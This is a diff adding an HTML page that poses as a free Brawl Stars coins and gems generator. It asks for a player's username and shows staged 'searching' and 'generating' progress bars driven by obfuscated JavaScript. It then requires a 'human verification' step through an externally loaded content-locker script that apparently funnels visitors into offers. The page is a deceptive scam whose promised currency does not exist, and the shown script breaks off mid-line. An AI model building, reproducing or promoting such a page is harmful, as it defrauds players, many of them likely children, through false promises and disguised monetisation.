@@ -1,0 +1,968 @@
+<!DOCTYPE html>
+<!--
+
+-->
+<html><head>
+    <title>Brawl Stars Coins and Gems Generator</title>
+<meta name="description" content="With this free coins and gems generator you can generate coins and gems for free in brawl stars."/>
+<meta property="og:title" content="Brawl Stars Coins and Gems Generator"/>
+<meta property="og:description" content="With this free coins and gems generator you can generate coins and gems for free in brawl stars."/>
+<meta name="referrer" content="no-referrer">
+
+  
+  <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
+<script>
+  window.OneSignalDeferred = window.OneSignalDeferred || [];
+  OneSignalDeferred.push(async function(OneSignal) {
+    await OneSignal.init({
+      appId: "3045354b-82a7-4e95-bf3a-8699a958a018",
+    });
+  });
+</script>
+  
+
+    <style>
+        .header_blue {
+            background: #1565c0;
+            padding: 80px 0 20px;
+            color: #fff;
+            font-size: 48px;
+            font-weight: 300;
+            margin-bottom: 40px;
+        }
+        .header_text {
+            margin-left: auto;
+            margin-right: auto;
+            width: 80%;
+        }
+        body{
+            margin:0;
+            font-family:Roboto, sans-serif;
+            color:#444;
+        }
+        .unlockBtn:hover{
+            box-shadow: 0 3px 6px rgba(0,0,0,.16), 0 3px 6px rgba(0,0,0,.23);
+        }
+        .unlockBtn {
+            background: #2196f3;
+            border: none;
+            border-radius: 2px;
+            box-shadow: 0 1px 3px rgba(0,0,0,.12), 0 1px 2px rgba(0,0,0,.24);
+            min-height: 31px;
+            min-width: 70px;
+            padding: 2px 16px;
+            text-align: center;
+            text-shadow: none;
+            text-transform: uppercase;
+            -webkit-transition: all 280ms ease;
+            transition: all 280ms ease;
+            box-sizing: border-box;
+            cursor: pointer;
+            -webkit-appearance: none;
+            display: inline-block;
+            vertical-align: middle;
+            font: 500 14px/31px Roboto,sans-serif!important;
+            outline: 0!important;
+            color:white;
+        }
+        .content-container{
+            width:80%;margin:0 auto;
+        }
+        @font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Pru33qjShpZSmG3z6VYwnRJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/oOeFwZNlrTefzLYmlVV1UBJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}
+        
+body{
+
+    font-family: 'Kanit Light', sans-serif;
+    overflow-y: auto;
+    margin: 0;
+    padding: 0;
+    color: black;
+    /* background-image: -webkit-gradient(linear, 0 0, 100% 100%, color-stop(0, #a21a0f), color-stop(100%, #efaa23));
+    background-image: -webkit-linear-gradient(135deg, #a21a0f, #efaa23);
+    background-image: -moz-linear-gradient(45deg, #a21a0f, #efaa23);
+    background-image: -ms-linear-gradient(45deg, #a21a0f 0, #efaa23 100%);
+    background-image: -o-linear-gradient(45deg, #a21a0f, #efaa23);
+    background-image: linear-gradient(135deg, #a21a0f, #efaa23); */
+    background: url("https://d2lmlpk6xgu7kg.cloudfront.net/uploads/16584372563d6bdfe0cd53d60ef06d0f1c00d86b71.png");
+    background-repeat: no-repeat;
+    background-size: cover;
+
+}
+
+div{
+    display: block;
+}
+
+.center{
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    min-height: 100vh;
+}
+
+.main{
+    text-align: center;
+    background: #f0f0f0;
+    width: 90%;
+    max-width:40em;
+    justify-content: center;
+    align-items: center;
+    border-radius: 1em;
+    border-color: white;
+    border-style: solid;
+    border-width: 0.1em;
+    box-shadow: 0 0 1em black;
+    box-sizing: border-box;
+    z-index: 5;
+}
+
+.points-box{
+    background: whitesmoke;
+    box-shadow: 0 0 10px black;
+    width: 50%;
+    max-width: 10em;
+    border-radius: 1em;
+    justify-content: center;
+    margin: 1em 0.5em 1em auto;
+    animation: pulse 1s ease infinite;
+}
+
+.points-box2{
+    background: whitesmoke;
+    box-shadow: 0 0 10px black;
+    width: 50%;
+    max-width: 10em;
+    border-radius: 1em;
+    justify-content: center;
+    margin: 1em auto 1em 0.5em;
+    animation: pulse 1s ease infinite;
+}
+
+.points-image{
+    width: 5em;
+    position: relative;
+    display: inline;
+    margin: 1em 0 0.5em 0;
+}
+
+.points-image2{
+    width: 5em;
+    position: relative;
+    display: inline;
+    margin: 2em 0 0.5em 0;
+}
+
+
+#vbucksamount1{
+    display: flex;
+    justify-content: center;
+    padding: 0 0 1em 0;
+}
+
+#vbucksamountcash{
+    display: flex;
+    justify-content: center;
+    padding: 0 0 1em 0;
+}
+
+.points{
+    display: flex;
+}
+@keyframes pulse {
+    0% {
+        transform: scale(0.98);
+        box-shadow: 0 0 0 0 rgba(0, 0, 0, 0.7);
+    }
+
+    70% {
+        transform: scale(1);
+        box-shadow: 0 0 0 4px rgba(0, 0, 0, 0);
+    }
+
+    100% {
+        transform: scale(0.98);
+        box-shadow: 0 0 0 0 rgba(0, 0, 0, 0);
+    }
+}
+
+.mainimg{
+    width: 13em;
+    position: relative;
+    margin:-3.5em 0 -2em 0;
+    background-color: #f0f0f0;
+    padding: 1em;
+    border-radius: 1em;
+    box-shadow: 0 -2px 0.3px black;
+}
+
+.step0-txt{
+    font-weight: 600;
+    font-size: 1.6em;
+    width: 80%;
+    margin: 1em auto;
+
+}
+
+.user-box{
+    overflow: auto;
+    position: relative;
+}
+
+.user-icon{
+    margin-top: 1.2em;
+    position: absolute;
+    width: 2.5em;
+    z-index: 2;
+    margin-left: 1.4em;
+}
+
+.user-input{
+    position: relative;
+    background: #FFFFFF;
+    outline: none;
+    box-shadow: none;
+    width: 15em;
+    height: 3em;
+    padding: 0 1em 0 2.5em;
+    font-size: 1.75em;
+    border-radius: 0.6em;
+    border-width: 0.12em;
+    border-color: #d4d4d4;
+    border-style: solid;
+    font-weight: bold;
+    box-sizing: border-box;
+    max-width: 40em;
+    vertical-align: middle;
+}
+
+.shakeanim{
+    animation: shake 0.3s ease-in-out;
+}
+
+@keyframes shake {
+    0%, 100% {
+        margin-left: 0;
+    }
+    20%, 80%{
+        margin-left: -0.5em;
+    }
+    40%, 60%{
+        margin-left: 0.5em;
+    }
+}
+
+input, textarea{
+    color: black;
+}
+
+::placeholder{
+    color: black;
+    opacity:40%;
+}
+
+.btn0 {
+    background: #19306e;
+    color: white;
+    width: 30%;
+    padding: 1em 0 1em 0;
+    margin: 0 auto;
+    margin-top: 1em;
+    margin-bottom: 1em;
+    border-radius: 0.5em;
+    font-weight: 900;
+    font-size: 1.5em;
+    box-sizing: border-box;
+    font-family: "Kanit Medium", sans-serif;
+}
+
+.btn0:hover{
+    background:#19306e;
+    transform: scale(1.1);
+    cursor: pointer;
+    box-shadow: 0 0 0.5em #19306e;
+}
+
+.btn1{
+    background: #19306e;
+    color: white;
+    width: 33%;
+    padding: 0.5em 0 0.5em 0;
+    margin: 1.5em auto;
+    border-radius: 0.5em;
+    font-weight: 600;
+    font-size: 1.5em;
+    box-sizing: border-box;
+    font-family: "Kanit Medium", sans-serif;
+    animation: zoom-in-zoom-out 1s ease infinite;
+}
+
+.btn1:hover{
+    background:whitesmoke;
+    color: #19306e;
+    transform: scale(1.1);
+    cursor: pointer;
+    box-shadow: 0 0 0.5em #19306e;
+}
+
+@keyframes zoom-in-zoom-out {
+    0% {
+        transform: scale(1, 1);
+    }
+    50% {
+        transform: scale(1.1, 1.1);
+    }
+    100% {
+        transform: scale(1, 1);
+    }
+}
+
+.devices{
+    display: flex;
+    justify-content: center;
+    margin-top: 1em;
+    box-sizing: border-box;
+    cursor: pointer;
+    float: none;
+    margin-bottom: 2em;
+}
+
+.platform{
+    background: #FFFFFF;
+    width: 8em;
+    height: 5.5em;
+    border-radius: 1em;
+    padding-top: 1em;
+    margin: 1em;
+    box-shadow: 0 0 0.6em black;
+}
+
+.platform:hover{
+    background:#FFFFFF;
+    transform: scale(1.1);
+    box-shadow: 0 0 0.5em #19306e;
+
+}
+
+.search0{
+    margin: 0 auto;
+    text-align: center;
+    height: 10em;
+    font-weight: 600;
+}
+
+.search1{
+    margin: 0 auto;
+    text-align: center;
+    height: 22em;
+    margin-top: 2em;
+}
+
+.laststep{
+    margin: 0 auto;
+    text-align: center;
+    height: auto;
+    margin-top: 2em;
+    font-family: 'Kanit Medium', sans-serif;
+}
+
+.searching{
+    width: fit-content;
+    background: #FFFFFF;
+    margin: 0 auto;
+    border-radius: 1em;
+    padding:0.5em;
+    font-size: 1.2em;
+    box-shadow: 0 0 0.6em black;
+}
+
+.searchingname{
+    margin: 0 1.5em;
+}
+
+#dots:after {
+    content: '.';
+    animation: dots 1s steps(5, end) infinite;}
+
+@keyframes dots {
+    0%, 20% {
+        color: rgba(0,0,0,0);
+        text-shadow:
+                .25em 0 0 rgba(0,0,0,0),
+                .5em 0 0 rgba(0,0,0,0);}
+    40% {
+        color: black;
+        text-shadow:
+                .25em 0 0 rgba(0,0,0,0),
+                .5em 0 0 rgba(0,0,0,0);}
+    60% {
+        text-shadow:
+                .25em 0 0 black,
+                .5em 0 0 rgba(0,0,0,0);}
+    80%, 100% {
+        text-shadow:
+                .25em 0 0 black,
+                .5em 0 0 black;}}
+
+
+.checkmark-icon{
+    width: 1em;
+    float: right;
+    margin-left: -1em;
+    margin-top: -1.2em;
+}
+
+.devices-pic{
+    width: 3em;
+    margin-top: 0.7em;
+}
+
+.devices-pic.ios{
+    margin-top: 0.5em;
+}
+
+.secondimg{
+    float:right;
+    width: 15em;
+    margin-top: 6.5em;
+    margin-right: 5em;
+}
+
+.VBucks-Div{
+    margin: 1em 0 2em 0;
+    cursor: pointer;
+}
+
+.VBucks-Div2{
+    margin: 1em 0 2em 0;
+    cursor: pointer;
+}
+
+.VBucks-pic{
+    width: 4em;
+}
+
+.vbucks-text{
+    font-size: 1.8em;
+    font-weight: 800;
+    margin-left:0.5em;
+}
+
+.VBucks{
+    background: #FFFFFF;
+    box-shadow: 0 0 0.6em black;
+    border-radius: 1em;
+    margin: 1em auto;
+    display: flex;
+    box-sizing: border-box;
+    position: relative;
+    width: 90%;
+    max-width: 40em;
+    height: 5em;
+    align-items: center;
+    justify-content: center;
+}
+
+.VBucks:hover{
+    background:#FFFFFF;
+    transform: scale(1.02);
+    box-shadow: 0 0 0.5em #19306e;
+    cursor: pointer;
+}
+
+.VBucks2{
+    background: #FFFFFF;
+    box-shadow: 0 0 0.6em black;
+    border-radius: 1em;
+    margin: 1em auto;
+    display: flex;
+    box-sizing: border-box;
+    position: relative;
+    width: 90%;
+    max-width: 40em;
+    height: 5em;
+    align-items: center;
+    justify-content: center;
+}
+
+.VBucks2:hover{
+    background:#FFFFFF;
+    transform: scale(1.02);
+    box-shadow: 0 0 0.5em #19306e;
+    cursor: pointer;
+}
+
+.Selected{
+    background: #19306e;
+    box-shadow: 0 0 0.5em #19306e;
+    color: #FFFFFF;
+    border-radius: 1em;
+    margin: 0.5em auto;
+    display: flex;
+    box-sizing: border-box;
+    position: relative;
+    width: 90%;
+    max-width: 40em;
+    height: 5em;
+    align-items: center;
+    justify-content: center;
+}
+
+.Selected2{
+    background: #19306e;
+    box-shadow: 0 0 0.5em #19306e;
+    color: #FFFFFF;
+    border-radius: 1em;
+    margin: 0.5em auto;
+    display: flex;
+    box-sizing: border-box;
+    position: relative;
+    width: 90%;
+    max-width: 40em;
+    height: 5em;
+    align-items: center;
+    justify-content: center;
+}
+
+.progress-bg{
+    margin-top: 0.5em;
+    width: 26em;
+    height: 1em;
+    background-color: whitesmoke;
+    border-radius: 0.5em;
+    display: inline-block;
+}
+.progress-bar{
+    margin-top: 0;
+    margin-left: -0.1em;
+    width: 0;
+    height: 1em;
+    background:#19306e;
+    border-radius: 0.5em;
+}
+.progressbar25{
+    animation: progress1 1s  linear;
+    animation-fill-mode: forwards;
+}
+@keyframes progress1{
+    0%  {width: 0;}
+    100%  {width: 25%;}
+}
+.progressbar40{
+    animation: progress2 2s  linear;
+    animation-fill-mode: forwards;
+}
+@keyframes progress2{
+    0%  {width: 25%;}
+    100%  {width: 40%;}
+}
+.progressbar75{
+    animation: progress3 1s  linear;
+    animation-fill-mode: forwards;
+}
+@keyframes progress3{
+    0%  {width: 40%;}
+    100%  {width: 75%;}
+}
+.progressbar95{
+    animation: progress4 1s  linear;
+    animation-fill-mode: forwards;
+}
+@keyframes progress4{
+    0%  {width: 75%;}
+    100%  {width: 95%;}
+}
+
+.settings-rotate{
+    animation: ranimation 2s linear infinite;
+}
+
+@keyframes ranimation {
+    0%  {transform: rotate(0deg);}
+    100%  {transform:  rotate(360deg);}
+}
+
+#loader{
+    animation: ranimation 2s linear infinite;
+    display: none;
+}
+
+.laststep-rotate{
+    animation: ranimation 2s linear infinite;
+    width: 5em;
+    margin-top: -5em;
+}
+
+.LastStepTxt {
+    font-size: 1.5em;
+    font-weight: 700;
+    width: 90%;
+    margin: 1em auto;
+}
+
+
+/*              Mobile                 */
+
+@media only screen and (max-width: 768px) {
+    .main{
+        margin-top: 5em;
+    }
+    .mainimg{
+        width: 10em;
+        margin: -3.2em 0 -1em 0;
+    }
+    .platform{
+        width: 6em;
+        height: 4em;
+    }
+
+    .johnwickgif{
+        margin-left: 7em;
+        position: absolute;
+        box-sizing: border-box;
+    }
+    .devices{
+        margin: 1em auto;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        /* position: absolute; */
+    }
+    .devices-pic{
+        width: 2.6em;
+        margin: 0 auto;
+    }
+    .devices-pic.ios{
+        margin-top: 0.1em;
+    }
+    .devices-pic.android{
+        margin-top: 0.1em;
+    }
+    .devices-pic.windows{
+        margin-top: 0.2em;
+    }
+    .platform{
+        margin: 0.8em;
+    }
+    .secondimg{
+        width: 20em;
+        margin-top: -1em;
+        box-sizing: border-box;
+    }
+    .VBucks-Div{
+        box-sizing: border-box;
+    }
+    .VBucks{
+        width: 90%;
+    }
+    .Selected{
+        width: 90%;
+    }
+    .vbucks-text{
+        font-size: 1.5em;
+        font-weight: 800;
+    }
+    .VBucks-pic{
+        width: 3em;
+        float: left;
+    }
+
+    .laststep{
+        height: 100%;
+    }
+
+    .step0-txt{
+        font-size: 1.5em;
+        margin-top: 1em;
+    }
+    .progress-bg{
+        width: 90%;
+    }
+    .settings-rotate{
+        margin-bottom: 1em;
+    }
+    .user-input{
+        width: 90%;
+    }
+    .btn0{
+        width: 40%;
+    }
+    .btn1{
+        width: 44%;
+    }
+    .checkmark-icon{
+        margin-top: -1.2em;
+    }
+    .desk-break{
+        display: none;
+    }
+}
+
+@media only screen and (max-width: 319px){
+    .VBucks{
+        width: 90%;
+    }
+    .vbucks-text{
+        font-size: 1.2em;
+        font-weight: 800;
+        margin-top: 0 auto;
+    }
+    .VBucks-pic{
+        display: none;
+    }
+    .user-input{
+        font-size: 22px;
+        margin: 0 auto;
+    }
+    .user-icon{
+        margin: 0.7em 0.8em;
+    }
+}
+
+@media only screen and (max-width: 395px){
+    .vbucks-text{
+        font-size: 1.2em;
+        font-weight: 800;
+        margin: 1.4em 1em;
+    }
+    .user-input{
+        font-size: 22px;
+    }
+    .user-icon{
+        margin: 0.6em 0.6em;
+    }
+}
+
+@media only screen and (max-width: 440px){
+    .secondimg{
+        display: none;
+    }
+    .devices{
+        margin: 1em auto;
+    }
+    .vbucks-text{
+        font-size: 1.4em;
+        font-weight: 800;
+        margin: 1em 1em;
+    }
+    .VBucks-pic{
+        margin-right: 0;
+    }
+    .btn0{
+        width: 50%;
+    }
+    .btn1{
+        width: 54%;
+    }
+}
+
+/* BG */
+.bg {
+    animation:slide 3s ease-in-out infinite alternate;
+    background-image: linear-gradient(-60deg, #c7603f 50%, #853f35 50%);
+    bottom:0;
+    left:-50%;
+    opacity:.5;
+    position:fixed;
+    right:-50%;
+    top:0;
+    z-index:-1;
+}
+
+.bg2 {
+    animation-direction:alternate-reverse;
+    animation-duration:4s;
+}
+
+.bg3 {
+    animation-duration:5s;
+}
+
+.content {
+    background-color:rgba(255,255,255,.8);
+    border-radius:.25em;
+    box-shadow:0 0 .25em rgba(0,0,0,.25);
+    box-sizing:border-box;
+    left:50%;
+    padding:10vmin;
+    position:fixed;
+    text-align:center;
+    top:50%;
+    transform:translate(-50%, -50%);
+}
+
+h1 {
+    font-family:monospace;
+}
+
+@keyframes slide {
+    0% {
+        transform:translateX(-25%);
+    }
+    100% {
+        transform:translateX(25%);
+    }
+}
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="me" href="https://www.blogger.com/profile/11084554265509350225" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/11084554265509350225" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/07984312076597446601" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+  <script type="text/javascript" id="ogjs" src="https://unlockcontent.net/cl/js/wokvgv"></script>
+
+
+
+</head>
+<body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>Brawl Stars Coins & Gems Generator</title>
+    <link rel="stylesheet" href="main.css">
+    <script src="script.js" defer></script>
+    <link rel="icon" type="image/png" href="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652193864c4bdbf1d3177aecdceb4a34fa1cb7d9b.png">
+</head>
+<body>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Kanit&display=swap');
+</style>
+
+<div class="bg"></div>
+<div class="bg bg2"></div>
+<div class="bg bg3"></div>
+
+<div class="center">
+    <div class="main" id="main0" style="display: 1none;">
+        <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/16516764447f97ea62eb2ffee4a4e8ff65077e562b.png" alt="Brawl Stars Logo" class="mainimg">
+        <div class="step0" id="step0">
+            <div class="step0-txt"> Enter your Username or ID to Generate <br class="desk-break"> Coins and Gems </div>
+            <div class="user-box" id="user-box">
+                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/16521063221bb696466af9a143142d50da47359338.png" class="user-icon">
+                <input class="user-input" id="input-id" placeholder="Username or ID">
+            </div>
+            <div class="btn0" id="btn0id" onclick="firstmain0()">NEXT</div>
+        </div>
+        <div class="search0" id="search0" style="display: none ;">
+            <div class="step0-txt" style="margin-bottom: 0.3em;">Searching<span id="dots"></span></div>
+            <div class="searching">
+                <div class="searchingdata">
+                    <div class="searchingname" id="searching-text-name"></div>
+                    <div><img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/16521928642e7a7c210f971e9f8a7a0fb86f92bb2a.png" class="checkmark-icon" id="checkmark-icon" style="display: none;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="main" id="main1" style="display: none;">
+        <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/16516764447f97ea62eb2ffee4a4e8ff65077e562b.png" alt="Brawl Stars Logo" class="mainimg">
+        <div class="step0-txt"> Select your device</div>
+        <div class="devices">
+            <div class="platform selectedPlatform" id="platform0" onclick="device_click()">
+                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652106952d1b126420c2e61f86903a650c6b5059b.png" class="devices-pic android">
+            </div>
+            <div class="platform" id="platform1" onclick="device_click()">
+                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/165210695181b32d93b95e48db0eb4b1c1015d7fd8.png" class="devices-pic ios">
+            </div>
+            <div class="platform" id="platform2" onclick="device_click()">
+                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/16521069526685e8acc2881e9f06e23c7eb8a19e4c.png" class="devices-pic windows">
+            </div>
+        </div>
+    </div>
+    <div class="main" id="main2" style="display: none;">
+        <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/16516764447f97ea62eb2ffee4a4e8ff65077e562b.png" alt="Brawl Stars Logo" class="mainimg">
+        <div class="step0" id="step1" style="display: 1none;">
+            <div class="step0-txt"> Select Coins Amount </div>
+            <div class="VBucks-Div" id="VBucks-div">
+                <div class="Selected" id="VBucks0" onclick="VBucksSelected('VBucks0','10000')">
+                    <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1658436504ad4837bd1756d77bc47c6c1119e1caac.png" class="VBucks-pic one">
+                    <div class="vbucks-text"> 10000 Coins </div>
+                </div>
+                <div class="VBucks" id="VBucks1" onclick="VBucksSelected('VBucks1','25000')">
+                    <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1658436504ad4837bd1756d77bc47c6c1119e1caac.png" class="VBucks-pic two">
+                    <div class="vbucks-text"> 25000 Coins </div>
+                </div>
+                <div class="VBucks" id="VBucks2" onclick="VBucksSelected('VBucks2','50000')">
+                    <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1658436504ad4837bd1756d77bc47c6c1119e1caac.png" class="VBucks-pic three">
+                    <div class="vbucks-text"> 50000 Coins </div>
+                </div>
+                <div class="VBucks" id="VBucks3" onclick="VBucksSelected('VBucks3','99999')">
+                    <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1658436504ad4837bd1756d77bc47c6c1119e1caac.png" class="VBucks-pic three">
+                    <div class="vbucks-text"> 99999 Coins </div>
+                </div>
+            </div>
+            <div class="btn0" id="btn-cointocash" onclick="cointocash()">Next</div>
+        </div>
+        <div class="step0" id="step1-1" style="display: none;">
+            <div class="step0-txt"> Select Gems Amount </div>
+            <div class="VBucks-Div" id="VBucks-div">
+                <div class="Selected2" id="VBucks4" onclick="VBucksSelected2('VBucks4','1000 ')">
+                    <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652193864c4bdbf1d3177aecdceb4a34fa1cb7d9b.png" class="VBucks-pic one">
+                    <div class="vbucks-text"> 1000 Gems </div>
+                </div>
+                <div class="VBucks2" id="VBucks5" onclick="VBucksSelected2('VBucks5','2500 ')">
+                    <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652193864c4bdbf1d3177aecdceb4a34fa1cb7d9b.png" class="VBucks-pic two">
+                    <div class="vbucks-text"> 2500 Gems </div>
+                </div>
+                <div class="VBucks2" id="VBucks6" onclick="VBucksSelected2('VBucks6','5000 ')">
+                    <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652193864c4bdbf1d3177aecdceb4a34fa1cb7d9b.png" class="VBucks-pic three">
+                    <div class="vbucks-text"> 5000 Gems </div>
+                </div>
+                <div class="VBucks2" id="VBucks7" onclick="VBucksSelected2('VBucks7','9999 ')">
+                    <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652193864c4bdbf1d3177aecdceb4a34fa1cb7d9b.png" class="VBucks-pic three">
+                    <div class="vbucks-text"> 9999 Gems </div>
+                </div>
+            </div>
+            <div class="btn0" id="btn1id" onclick="GenerateButton()">Generate</div>
+        </div>
+
+        <div class="search1" id="search1" style="display: none ;">
+            <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652194594fea7175a707ceefbaa64e6857ffd6767.png" class="settings-rotate">
+            <div class="step0-txt" id="Generating-step0">Getting Ready..</div>
+            <div class="progress-bg">
+                <div class="progress-bar" id="progress-bar">
+                </div>
+                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652113019440ef225735d8aab8fc45ec04e7a6aa4.png" id="loader" style="margin-top: 2em; width: 2em;">
+            </div>
+        </div>
+    </div>
+    <div class="main" id="main3" style="display: none;">
+        <div class="laststep" id="laststep" style="display: 1none ;">
+            <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652194619c7feb47a1add45dc53247b16cbcf8ab0.png" class="laststep-rotate">
+            <div class="LastStepTxt" id="LastStepTxt">Hello <span id="Name-LastStep" style="color: #294598; font-weight: bold;"></span>! You are almost there. <br><br> To generate <span id="vbucksamount" style="color: #294598; font-weight: 900;"></span> Coins and <span id="vbucksamount2" style="color: #294598; font-weight: 900;"></span> Gems into your account complete the human verification. Click on the button to verify. </div>
+            <div class="points">
+                <div class="points-box">
+                    <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1658436504ad4837bd1756d77bc47c6c1119e1caac.png" class="points-image">
+                    <span id="vbucksamount1" style="font-weight: 900; font-size: large;"></span>
+                </div>
+                <div class="points-box2">
+                    <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652193864c4bdbf1d3177aecdceb4a34fa1cb7d9b.png" class="points-image2">
+                    <span id="vbucksamountcash" style="font-weight: 900; font-size: large;"></span>
+                </div>
+            </div>
+            <div class="btn1" id="btn2id" onclick="og_load();"> Verify </div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
+
+<script type="text/javascript">
+    var _0x3c43b5=_0x16e2;(function(_0x246e24,_0x2dd5a8){var _0x2c2507=_0x16e2,_0x353703=_0x246e24();while(!![]){try{var _0x2e0b66=parseInt(_0x2c2507(0x1af))/0x1+-parseInt(_0x2c2507(0x1b4))/0x2+-parseInt(_0x2c2507(0x181))/0x3*(parseInt(_0x2c2507(0x19e))/0x4)+parseInt(_0x2c2507(0x18b))/0x5+-parseInt(_0x2c2507(0x183))/0x6*(parseInt(_0x2c2507(0x1a8))/0x7)+parseInt(_0x2c2507(0x1aa))/0x8*(parseInt(_0x2c2507(0x1a1))/0x9)+parseInt(_0x2c2507(0x17d))/0xa;if(_0x2e0b66===_0x2dd5a8)break;else _0x353703['push'](_0x353703['shift']());}catch(_0x36b20b){_0x353703['push'](_0x353703['shift']());}}}(_0x4351,0xa8bdb));function _0x4351(){var _0x490eae=['vbucksamount2','main1','VBucks0','value','Loading\x20last\x20step..','progressbar95','progress-bar','Generating-step0','vbucksamount','VBucks','progressbar25','length','input-id','5076892bYEsLz','block','btn1id','9nKFSIN','main2','VBucks6','checkmark-icon','none','progressbar40','main0','2412823GKLmQY','innerHTML','7622744JqpoJn','dots','remove','VBucks1','platform2','321570EmSMsI','borderBottom','VBucks4','vbucksamountcash','click','1048692vepiSR','step1','VBucks7','step1-1','getElementById','VBucks5','searching-text-name','addEventListener','search0','12377960kZlhzK','VBucks3','VBucks2','search1','3QxaPEW','Selected','6uwDOXw','style','classList','Selected2','display','Finalizing...','removeProperty','loader','1586060vCXyAW','shakeanim','add','user-box','main3','Name-LastStep'];_0x4351=function(){return _0x490eae;};return _0x4351();}var vbucksValue=0x2710,vbucksValue2=0x3e8,name='';function firstmain0(){var _0x27c592=_0x16e2;name=document['getElementById'](_0x27c592(0x19d))[_0x27c592(0x194)],name==''||name[_0x27c592(0x19c)]<=0x2?(document['getElementById'](_0x27c592(0x19d))[_0x27c592(0x184)][_0x27c592(0x1b0)]='0.12em\x20solid\x20darkred',document[_0x27c592(0x1b8)]('user-box')[_0x27c592(0x185)]['add'](_0x27c592(0x18c)),setTimeout(function(){var _0x47145c=_0x27c592;document['getElementById'](_0x47145c(0x19d))['style'][_0x47145c(0x189)]('border-Bottom'),document[_0x47145c(0x1b8)](_0x47145c(0x18e))['classList'][_0x47145c(0x1ac)](_0x47145c(0x18c));},0x5dc)):setTimeout(function(){var _0x5bf291=_0x27c592;document[_0x5bf291(0x1b8)](_0x5bf291(0x1ba))['innerHTML']=name,document['getElementById']('step0')[_0x5bf291(0x184)][_0x5bf291(0x187)]=_0x5bf291(0x1a5),setTimeout(function(){var _0x9c60e3=_0x5bf291;document['getElementById'](_0x9c60e3(0x17c))[_0x9c60e3(0x184)][_0x9c60e3(0x187)]=_0x9c60e3(0x19f),setTimeout(function(){var _0x3f37a2=_0x9c60e3;document[_0x3f37a2(0x1b8)](_0x3f37a2(0x1a4))['style']['display']=_0x3f37a2(0x19f),document[_0x3f37a2(0x1b8)](_0x3f37a2(0x1ab))[_0x3f37a2(0x184)][_0x3f37a2(0x187)]=_0x3f37a2(0x1a5),setTimeout(function(){var _0x24516f=_0x3f37a2;document[_0x24516f(0x1b8)](_0x24516f(0x1a7))[_0x24516f(0x184)][_0x24516f(0x187)]=_0x24516f(0x1a5),setTimeout(function(){var _0x489f0d=_0x24516f;document[_0x489f0d(0x1b8)](_0x489f0d(0x192))[_0x489f0d(0x184)][_0x489f0d(0x187)]=_0x489f0d(0x19f);},0x64);},0x7d0);},0x1388);},0x64);},0x64);}function device_click(){var _0x368145=_0x16e2;document[_0x368145(0x1b8)](_0x368145(0x192))[_0x368145(0x184)][_0x368145(0x187)]=_0x368145(0x1a5),setTimeout(function(){var 